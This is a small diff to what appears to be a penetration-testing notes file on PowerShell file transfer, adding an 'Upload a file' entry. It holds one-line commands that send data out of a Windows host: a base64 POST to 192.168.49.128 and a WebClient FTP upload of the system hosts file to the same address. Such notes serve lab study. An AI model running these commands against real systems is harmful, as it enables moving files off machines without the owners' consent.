@@ -52,6 +52,12 @@ Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
 ```
 ^send-b64-post
 
+Upload a file
+```powershell
+(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
+```
+^uploadfile-method
+
 ### Category 2
 
 **Get-ChildItem** is the PowerShell equivalent of dir
